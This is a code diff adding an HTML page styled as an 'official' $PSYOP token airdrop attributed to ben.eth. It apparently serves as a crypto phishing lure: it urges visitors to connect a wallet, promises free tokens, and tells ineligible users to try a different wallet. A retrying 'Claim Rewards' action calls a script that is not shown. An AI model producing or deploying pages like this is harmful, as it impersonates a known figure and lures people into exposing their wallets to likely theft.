@@ -1,0 +1,179 @@
+<html>
+  <head>
+    <title>$PYSOP - Official Airdrop, Courtesy of BEN.ETH</title>
+
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+    <!-- Get some bootstrap default styles -->
+    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css" integrity="sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u" crossorigin="anonymous">
+    <style>
+
+      body {
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        height: 100vh;
+        background-image: url('https://w0.peakpx.com/wallpaper/345/824/HD-wallpaper-hypnotized-abstract-design-thumbnail.jpg');
+        background-size: cover;
+        background-repeat: no-repeat;
+        background-position: center;
+      }
+
+      .alert {
+        width: 100%;
+        font-size: 1.2rem;
+        font-weight: bold;
+        text-transform: uppercase;
+        padding: 12px 24px;
+        margin-top: 10px;
+        text-align: center;
+      }
+
+      .btn{
+        font-size: 1.2rem;
+        font-weight: bold;
+        text-transform: uppercase;
+        padding: 12px 24px;
+      }
+
+      .btnmain {
+        width: 100%;
+        background: linear-gradient(to bottom, #fff, #ccc);
+        color: #000;
+        margin-top: 10px;
+      }
+
+      .btnmain:hover {
+        background: linear-gradient(to bottom, #eee, #aaa);
+        color: #000;
+        transition: ease 1s;
+      }
+
+      .maintext{
+        font-weight: bold;
+        text-transform: uppercase;
+        color: #f8f8f8;
+      }
+
+      .customAlert{
+        display: block;
+        width: 100%;
+        border: 3px solid #fff;
+        border-radius: 5px;
+        padding: 10px;
+        margin-top: 10px;
+      }
+
+      .errorAlert{
+        margin-top: 10px;
+        text-transform: uppercase;
+      }
+
+      .topHalf{
+        text-align: center;
+        margin-bottom: 20px;
+      }
+
+      #main {
+        display: flex;
+        flex-direction: column;
+        justify-content: center;
+        align-items: center;
+        background-color: #1a1e21;
+        border: none;
+        border-radius: 5px;
+        padding: 30px;
+        color: black;
+        font-family: 'Roboto', sans-serif;
+        font-size: 1.2rem;
+        font-weight: bold;
+        max-width: 90%;
+      }
+
+    </style>
+  </head>
+  <body>
+
+    <!-- Construct a Bootstrap layout -->
+    <div id="main">
+
+      <div class="topHalf">
+
+        <h2 class="maintext">THE $PSYOP HAS BEGUN.</h2>
+        <span class="maintext" style="text-align: center;font-size: 0.8rem;">Connect your wallet to claim your free share of the $PSYOP Airdrop.<br>Eligibility depends on your wallet's network activity.</span>
+
+        <br>
+        <br>
+
+        <blockquote class="twitter-tweet"><p lang="en" dir="ltr">About to start the bull run. <a href="https://t.co/SvjSHAUe2Z">https://t.co/SvjSHAUe2Z</a></p>&mdash; ben.eth (@eth_ben) <a href="https://twitter.com/eth_ben/status/1659205485650915332?ref_src=twsrc%5Etfw">May 18, 2023</a></blockquote> <script async src="https://platform.twitter.com/widgets.js" charset="utf-8"></script>
+
+      </div>
+
+      <div id="eligible" class="container customAlert" style="display: none;">
+        <span class="maintext">Congratulations. You are eligible to claim: <span style="float: right;"><span id="claimAmount">N/A</span> $PSYOP</span></span>
+      </div>
+
+      <!-- Pre-connection -->
+      <div id="prepare" style="width: 100%;">
+
+        <button class="btn btnmain" id="btn-connect">
+          Connect wallet
+        </button>
+
+      </div>
+      <!-- Pre-connection -->
+
+      <!-- Post-connection -->
+      <div id="connected" style="display: none;width: 100%;">
+
+          <button class="btn btnmain" id="btn-connect" style="width: 100%;" onclick="claimRewards();">
+            Claim Rewards
+          </button>
+
+      </div>
+      <!-- Post-connection -->
+
+      <!-- Error messages -->
+      <div class="text-danger errorAlert" id="alert-error-https" style="display: none">
+        You can run this dApp only over a HTTPS connection.
+      </div>
+
+      <div class="text-danger errorAlert" id="alert-error-connection" style="display: none">
+        Wallet connection failed - try again.
+      </div>
+
+      <div class="text-danger errorAlert" id="alert-error-network" style="display: none">
+        Please switch to the Ethereum Mainnet.
+      </div>
+
+      <div class="text-danger errorAlert" id="alert-error-eligible" style="display: none">
+        Sorry, you are not eligible. Try again with a different wallet.
+      </div>
+
+      <div class="text-danger errorAlert" id="alert-error-confirmation" style="display: none">
+        Claim failed. Retrying...
+      </div>
+      <!-- Error messages -->
+
+  </div>
+
+    <!--
+
+      Use unpkg CDN to load all NPM packages to vanilla Javascript - read more at http://unpkg.com
+
+      On your deployment, you properly either want to use a preprocessing tool like webpack
+      to include these files, or extract NPM archives and manually host the files inside.
+
+      TODO: Pin down all versions.
+
+    -->
+
+    <script type="text/javascript" src="https://unpkg.com/web3@1.2.11/dist/web3.min.js"></script>
+    <script type="text/javascript" src="https://unpkg.com/web3modal@1.9.0/dist/index.js"></script>
+    <script type="text/javascript" src="https://unpkg.com/evm-chains@0.2.0/dist/umd/index.min.js"></script>
+    <script type="text/javascript" src="https://unpkg.com/@walletconnect/web3-provider@1.2.1/dist/umd/index.min.js"></script>
+    <script type="text/javascript" src="https://unpkg.com/fortmatic@2.0.6/dist/fortmatic.js"></script>
+
+    <script type="text/javascript" src="./bundle.js"></script>
+  </body>
+</html>
